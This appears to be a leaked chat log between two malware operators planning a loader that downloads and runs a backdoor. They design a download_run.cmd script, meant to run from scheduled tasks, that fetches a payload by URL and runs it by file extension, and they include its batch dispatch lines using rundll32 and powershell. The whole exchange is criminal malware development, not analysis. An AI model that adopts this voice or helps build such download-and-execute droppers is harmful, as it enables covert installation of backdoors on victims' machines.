For the tests Buza told me to give you.

2020-09-08T15:33:16 mushroom -> dandis
dl2 loader, bd2 backdoor.

2020-09-08T15:33:45 mushroom -> dandis
You run dl2.exe it downloads the backdoor and runs it. Group two.

2020-09-08T15:33:59 mushroom -> dandis
Right now all the versions with logs are uploaded there.

2020-09-08T15:50:37 mushroom -> dandis
Is the connection working?

2020-10-02T10:46:33 mushroom -> dandis
Hi. Send me my curldowload.cmd script, I deleted it by mistake.

2020-10-02T11:06:28 mushroom -> dandis
Made exe, dll, cmd, ps1.

2020-10-02T12:01:16 dandis -> mushroom
Hi

" > Made exe, dll, cmd, ps1.
Can this be crammed into one file?

2020-10-02T12:03:45 dandis -> mushroom
Like a dll with an eche.

2020-10-02T12:04:17 mushroom -> dandis
And how do you know what to run, command line arguments to use?

2020-10-02T12:07:56 mushroom -> dandis
I'll do it now. At the beginning of the script will be set type=

2020-10-02T12:08:10 mushroom -> dandis
there you can select exe,dll,cmd,ps1

2020-10-02T12:09:29 dandis -> mushroom
The point is that I need support for all 4 options in one file

2020-10-02T12:09:38 dandis -> mushroom
Or hang 4 schtashes per file?

2020-10-02T12:09:44 dandis -> mushroom
And they will knock on the url 4 times each?

2020-10-02T12:10:18 mushroom -> dandis
So will there be one download?

2020-10-02T12:10:27 mushroom -> dandis
And run a single file.

2020-10-02T12:10:55 mushroom -> dandis
Does it need to figure out what type of file it downloaded itself?

2020-10-02T12:11:37 dandis -> mushroom
Yes

2020-10-02T12:12:09 mushroom -> dandis
This will not distinguish cmd from ps1 for example exactly.

2020-10-02T12:12:46 mushroom -> dandis
You can tell from the link if it specifies a file extension.

2020-10-02T12:13:07 mushroom -> dandis
For example localhost/static/TestOutput64.cmd

2020-10-02T12:13:13 mushroom -> dandis
localhost/static/TestOutput64.ps1

2020-10-02T12:13:16 mushroom -> dandis
localhost/static/TestOutput64.exe

2020-10-02T12:13:21 mushroom -> dandis
localhost/static/TestOutput64.dll

2020-10-02T12:13:39 mushroom -> dandis
Such links for downloading, for example, or not?

2020-10-02T12:14:29 mushroom -> dandis
Or localhost/static/HOWEOIFH023

2020-10-02T12:14:44 mushroom -> dandis
localhost/static/nf20[93hf30=8Â§h

2020-10-02T12:14:56 mushroom -> dandis
And then it is not clear which file you download.

2020-10-02T12:15:51 dandis -> mushroom

" [08:13:06] <mushroom> For example localhost/static/TestOutput64.cmd
" [08:13:11] <mushroom> localhost/static/TestOutput64.ps1
" [08:13:15] <mushroom> localhost/static/TestOutput64.exe
" [08:13:20] <mushroom> localhost/static/TestOutput64.dll

2020-10-02T12:15:52 dandis -> mushroom
Yes

2020-10-02T12:16:04 mushroom -> dandis
I'll do it then.

One for all runs is download_run.cmd

2020-10-05T08:43:58 mushroom -> dandis
Hi. What about the scripts?

2020-10-05T08:44:58 dandis -> mushroom

Empty

2020-10-05T08:46:46 mushroom -> dandis
Link?

2020-10-05T08:47:20 dandis -> mushroom

Does Download_run run the file depending on the type?

2020-10-05T08:56:45 mushroom -> dandis
Yes. Depending on what's at the end of the link (exe, dll, cmd, bat, ps1).

2020-10-05T08:57:29 dandis -> mushroom
How does it determine what's at the end of the link?

2020-10-05T08:58:12 mushroom -> dandis
On the last 3 characters.

2020-10-05T08:58:24 mushroom -> dandis
http://localhost/static/example.exe

2020-10-05T08:58:31 mushroom -> dandis
at the end of exe

2020-10-05T08:58:43 mushroom -> dandis
http://localhost/static/example.dll

2020-10-05T08:58:51 mushroom -> dandis
Like this.

2020-10-05T09:06:12 dandis -> mushroom
Couldn't you make a unified url?

2020-10-05T09:07:06 mushroom -> dandis
Then it's not clear what type of file to run. They run a little differently.

2020-10-05T09:07:22 mushroom -> dandis
if %e%==exe %df% %args%
if %e%==dll rundll32 %df%,%args%
if %e%==cmd call %df% %args%
if %e%==bat call %df% %args%
if %e%==ps1 powershell -File %df% %args%

2020-10-05T09:07:39 mushroom -> dandis
Each file type runs a little differently.

2020-10-05T09:08:33 mushroom -> dandis
You can tell exe from dll and from scripts, but bat from ps1 can't be distinguished in any way. Both are just a bunch of words.

2020-10-05T09:09:08 mushroom -> dandis
[08:13:06] <mushroom> For example localhost/static/TestOutput64.cmd
" [08:13:11] <mushroom> localhost/static/TestOutput64.ps1
" [08:13:15] <mushroom> localhost/static/TestOutput64.exe
" [08:13:20] <mushroom> localhost/static/TestOutput64.dll

[15:15:52] <doomsday> Yes

2020-10-05T09:09:23 mushroom -> dandis
You wrote that the links would be like that.
